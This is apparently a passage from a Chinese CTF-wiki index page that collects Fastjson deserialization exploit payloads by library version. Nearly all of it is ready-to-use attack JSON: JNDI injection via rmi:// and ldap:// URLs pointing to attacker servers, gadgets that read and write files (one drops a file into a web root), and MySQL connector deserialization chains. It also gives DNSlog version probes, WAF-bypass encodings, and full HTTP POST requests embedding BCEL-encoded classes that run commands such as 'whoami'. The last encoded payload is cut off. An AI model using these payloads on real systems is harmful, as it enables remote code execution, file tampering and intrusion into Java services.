\u9700\u8981\u5f00\u542fAutoType\uff1b Fastjson <= 1.2.62\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b \u76ee\u6807\u670d\u52a1\u7aef\u9700\u8981\u5b58\u5728xbean-reflect\u5305\uff1b { \"@type\" : \"org.apache.xbean.propertyeditor.JndiConverter\" , \"AsText\" : \"rmi://127.0.0.1:1098/exploit\" } { \"@type\" : \"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\" , \"parameters\" : { \"@type\" : \"java.util.Hashtable\" , \"java.naming.factory.initial\" : \"com.sun.jndi.rmi.registry.RegistryContextFactory\" , \"topic-factory\" : \"ldap://localhost:1389/Exploit\" }, \"namespace\" : \"\" } fastjson<=1.2.66 \u00b6 \u524d\u63d0\u6761\u4ef6 \u00b6 \u5f00\u542fAutoType\uff1b Fastjson <= 1.2.66\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b org.apache.shiro.jndi.JndiObjectFactory\u7c7b\u9700\u8981shiro-core\u5305\uff1b br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\u9700\u8981Anteros-Core\u548cAnteros-DBCP\u5305\uff1b com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\u7c7b\u9700\u8981ibatis-sqlmap\u548cjta\u5305\uff1b { \"@type\" : \"org.apache.shiro.jndi.JndiObjectFactory\" , \"resourceName\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"org.apache.shiro.realm.jndi.JndiRealmFactory\" , \"jndiNames\" : [ \"ldap://localhost:1389/Exploit\" ] , \"Realms\" : [ \"\" ] } { \"@type\" : \"br.com.anteros.dbcp.AnterosDBCPConfig\" , \"metricRegistry\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"br.com.anteros.dbcp.AnterosDBCPConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\" , \"jndiNames\" : \"ldap://192.168.80.1:1389/Calc\" } { \"@type\" : \"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\" , \"properties\" : { \"@type\" : \"java.util.Properties\" , \"UserTransaction\" : \"ldap://192.168.80.1:1399/Calc\" }} \u9002\u7528\u4e8ejdk11\u4ee5\u4e0a\u7248\u672c\u7684\u5199\u6587\u4ef6\u7684payload\uff1a { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"sun.rmi.server.MarshalOutputStream\" , \"out\" : { \"@type\" : \"java.util.zip.InflaterOutputStream\" , \"out\" : { \"@type\" : \"java.io.FileOutputStream\" , \"file\" : \"/tmp/asdasd\" , \"append\" : true }, \"infl\" : { \"input\" : { \"array\" : \"eJxLLE5JTCkGAAh5AnE=\" , \"limit\" : 14 } }, \"bufLen\" : \"100\" }, \"protocolVersion\" : 1 } fastjson<=1.2.67 \u00b6 \u524d\u63d0\u6761\u4ef6 \u00b6 \u5f00\u542fAutoType\uff1b Fastjson <= 1.2.67\uff1b JNDI\u6ce8\u5165\u5229\u7528\u6240\u53d7\u7684JDK\u7248\u672c\u9650\u5236\uff1b org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\u7c7b\u9700\u8981ignite-core\u3001ignite-jta\u548cjta\u4f9d\u8d56\uff1b org.apache.shiro.jndi.JndiObjectFactory\u7c7b\u9700\u8981shiro-core\u548cslf4j-api\u4f9d\u8d56\uff1b { \"@type\" : \"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\" , \"jndiNames\" :[ \"ldap://localhost:1389/Exploit\" ], \"tm\" : { \"$ref\" : \"$.tm\" }} { \"@type\" : \"org.apache.shiro.jndi.JndiObjectFactory\" , \"resourceName\" : \"ldap://localhost:1389/Exploit\" , \"instance\" :{ \"$ref\" : \"$.instance\" }} fastjson<=1.2.68 \u00b6 Fastjson <= 1.2.68\uff1b \u5229\u7528\u7c7b\u5fc5\u987b\u662fexpectClass\u7c7b\u7684\u5b50\u7c7b\u6216\u5b9e\u73b0\u7c7b\uff0c\u5e76\u4e14\u4e0d\u5728\u9ed1\u540d\u5355\u4e2d\uff1b { \"@type\" : \"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\" , \"metricRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\" , \"healthCheckRegistry\" : \"ldap://localhost:1389/Exploit\" } { \"@type\" : \"com.caucho.config.types.ResourceRef\" , \"lookupName\" : \"ldap://localhost:1389/Exploit\" , \"value\" : { \"$ref\" : \"$.value\" }} \u65e0\u9700\u5f00\u542fAutoType\uff0c\u76f4\u63a5\u6210\u529f\u7ed5\u8fc7CheckAutoType()\u7684\u68c0\u6d4b\u4ece\u800c\u89e6\u53d1\u6267\u884c\uff1a { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"vul.VulAutoCloseable\" , \"cmd\" : \"calc\" } \u8bfb\u6587\u4ef6 { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"tempPath\" : \"C:/Windows/win.ini\" , \"targetPath\" : \"D:/wamp64/www/win.txt\" } \u5199\u6587\u4ef6 { \"stream\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"targetPath\" : \"D:/wamp64/www/hacked.txt\" , \"tempPath\" : \"D:/wamp64/www/test.txt\" }, \"writer\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.esotericsoftware.kryo.io.Output\" , \"buffer\" : \"cHduZWQ=\" , \"outputStream\" : { \"$ref\" : \"$.stream\" }, \"position\" : 5 }, \"close\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.sleepycat.bind.serial.SerialOutput\" , \"out\" : { \"$ref\" : \"$.writer\" } } } \u5199\u6587\u4ef6 { ' stream ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' java . io . FileOutputStream ' , ' file ':' / tmp / nonexist ' , ' append ' : false }, ' writer ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' org . apache . solr . common . util . FastOutputStream ' , ' tempBuffer ':' SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4 = ' , ' sink ' : { ' $ref ':' $ . stream ' }, ' start ' : 38 }, ' close ' : { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' org . iq80 . snappy . SnappyOutputStream ' , ' out ' : { ' $ref ':' $ . writer ' } } } \u9002\u7528\u4e8ejdk8/10\u7684 { ' @type ' : \"java.lang.AutoCloseable\" , ' @type ':' sun . rmi . server . MarshalOutputStream ' , ' out ' : { ' @type ':' java . util . zip . InflaterOutputStream ' , ' out ' : { ' @type ':' java . io . FileOutputStream ' , ' file ':' dst ' , ' append ' : false }, ' infl ' : { ' input ':' eJwL8nUyNDJSyCxWyEgtSgUAHKUENw == ' }, ' bufLen ' : 1048576 }, ' protocolVersion ' : 1 } 2021\u9ed1\u5e3d\u5927\u4f1a\u817e\u8baf\u7384\u6b66\u62ab\u9732 \u8be6\u7ec6\u6f0f\u6d1e\u539f\u7406\u5f85\u7814\u7a76 Mysqlconnector 5.1 . x { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.mysql.jdbc.JDBC4Connection\" , \"hostToConnectTo\" : \"mysql.host\" , \"portToConnectTo\" : 3306 , \"info\" :{ \"user\" : \u201d user \",\" password \":\u201dpass\" , \"statementInterceptors\" : \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\" , \"autoDeserialize\" : \"true\" , \"NUM_HOSTS\" : \"1\" }, \"databaseToConnectTo\" : \u201d dbname \",\" url \":\"\"} Mysqlconnector 6.0.2 or 6.0.3 {\" @type \": \" java . lang . AutoCloseable \",\" @type \": \" com . mysql . cj . jdbc . ha . LoadBalancedMySQLConnection \",\" proxy \":{\" connectionString \":{\" url \": \" jdbc : mysql : //localhost:3306/foo?allowLoadLocalInfile=true\"}}} Mysqlconnector 6. x or < 8.0.20 { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\" , \"proxy\" :{ \"@type\" : \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\" , \"connectionUrl\" :{ \"@type\" : \"com.mysql.cj.conf.url.ReplicationConnectionUrl\" , \"masters\" : [ { \"host\" : \"mysql.host\" } ] , \"slaves\" : [] , \"properties\" :{ \"host\" : \"mysql.host\" , \"user\" : \"user\" , \"dbname\" : \"dbname\" , \"password\" : \"pass\" , \"queryInterceptors\" : \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\" , \"autoDeserialize\" : \"true\" }}}} fastjson\u672a\u77e5\u7248\u672c \u00b6 \u5f85\u63a2\u7d22 { \"@type\" : \"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\" , \"tmJndiName\" : \"ldap://localhost:1389/Exploit\" , \"tmFromJndi\" : true , \"transactionManager\" : { \"$ref\" : \"$.transactionManager\" }} { \"@type\" : \"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\" , \"tmJndiName\" : \"ldap://localhost:1389/Exploit\" , \"tmFromJndi\" : true , \"transactionManager\" : { \"$ref\" : \"$.transactionManager\" }} bypasswaf \u00b6 Fastjson\u9ed8\u8ba4\u4f1a\u53bb\u9664\u952e\u3001\u503c\u5916\u7684\u7a7a\u683c\u3001 \\b \u3001 \\n \u3001 \\r \u3001 \\f \u7b49\uff0c\u540c\u65f6\u8fd8\u4f1a\u81ea\u52a8\u5c06\u952e\u4e0e\u503c\u8fdb\u884cunicode\u4e0e\u5341\u516d\u8fdb\u5236\u89e3\u7801\u3002 { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { /*s6*/ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \\ n \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"@type\" \\ b : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"\\u0040\\u0074\\u0079\\u0070\\u0065\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true } { \"\\x40\\x74\\x79\\x70\\x65\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://10.251.0.111:9999\" , \"autoCommit\" : true }","title":"Fastjson"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson","text":"Fastjson\u59ff\u52bf\u6280\u5de7\u96c6\u5408","title":"Fastjson"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#_1","text":"\u7528\u6765\u63a2\u6d4b\u76ee\u6807\u7248\u672c\uff0c\u624d\u80fd\u66f4\u597d\u786e\u5b9a\u4f7f\u7528\u7684payload\u3002\u8fd8\u53ef\u4ee5\u7528\u6765\u533a\u5206fastjson\u548cJackjson\u3002 fastjson\u63a2\u6d4b\u7248\u672c\uff0c\u8fd8\u53ef\u4ee5\u7528\u9519\u8bef\u683c\u5f0f\u7684json\u53d1\u8fc7\u53bb\u3002\u5982\u679c\u5bf9\u65b9\u5f02\u5e38\u672a\u5904\u7406\u53ef\u62a5\u51fa\u8be6\u7ec6\u7248\u672c\u3002 \u4e3b\u8981\u662f\u5229\u7528\u5404\u4e2a\u7c7b\u88ab\u52a0\u5165\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u8fdb\u884c\u5224\u65ad fastjson >1.2.43 { \"@type\" : \"java.net.URL\" , \"val\" : \"dnslog\" } fastjson >1.2.48 { \"@type\" : \"java.net.InetAddress\" , \"val\" : \"dnslog\" } fastjson >1.2.68 { \"@type\" : \"java.net.Inet4Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.Inet6Address\" , \"val\" : \"dnslog\" } {{ \"@type\" : \"java.net.URL\" , \"val\" : \"dnslog\" }: \"aaa\" } { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }} \"\" } Set [ { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" } ] Set [ { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" } { \"@type\" : \"java.net.InetSocketAddress\" { \"address\" :, \"val\" : \"dnslog\" }} {{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }: 0","title":"\u63a2\u6d4b"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#_2","text":"\u9664\u4e86\u8003\u8651Fastjson\u7248\u672c\uff0c\u8fd8\u5f97\u8003\u8651JDK\u7248\u672c\uff0c\u4e2d\u95f4\u4ef6\u7248\u672c\uff0c\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7248\u672c\u3002 JDK\u7248\u672c\u5bf9\u4e8eJDNI\u6ce8\u5165\u7684\u9650\u5236\uff0c\u57fa\u4e8eRMI\u5229\u7528\u7684JDK\u7248\u672c<=6u141\u30017u131\u30018u121\uff0c\u57fa\u4e8eLDAP\u5229\u7528\u7684JDK\u7248\u672c<=6u211\u30017u201\u30018u191\u3002\uff08\u66f4\u9ad8\u7248\u672c\u4e5f\u6709\u7ed5\u8fc7\uff09 \u66f4\u9ad8\u7248\u672c\u7ed5\u8fc7\u53ef\u7528https://github.com/veracode-research/rogue-jndi jndi JdbcRowSetImpl C3p0#JndiRefForwardingDataSource JndiDataSourceFactory bcel tomcat#dbcp ibatis TemplatesImpl","title":"\u5404\u7248\u672c\u5229\u7528"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#fastjson-1222-1224","text":"","title":"Fastjson 1.2.22-1.2.24"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#jdbcrowsetimpl","text":"{ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://127.0.0.1:1099/badClassName\" , \"autoCommit\" : true }","title":"JdbcRowSetImpl"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#c3p0jndirefforwardingdatasource","text":"JdbcRowSetImpl\u65e0\u6cd5\u6210\u529f\u53ef\u4ee5\u4e00\u8bd5 { \"@type\" : \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\" , \"jndiName\" : \"rmi://127.0.0.1:1099/badClassName\" , \"loginTimeout\" : 0 }","title":"c3p0#JndiRefForwardingDataSource"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/#bcel","text":"\u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 \u9700\u8981\u6ce8\u610f\u5728Java 8u251\u4ee5\u540e\uff0cbcel\u7c7b\u88ab\u5220\u9664\u3002 tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource tomcat8\u53ca\u5176\u4ee5\u540e org.apache.tomcat.dbcp.dbcp2.BasicDataSource Poc { { \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } exp \u6267\u884c\u547d\u4ee4\u56de\u663e. POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: whoami Content - Length : 3327 { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\" } }: \"x\" } POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: ver && echo fastjson Content - Length : 3327 { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c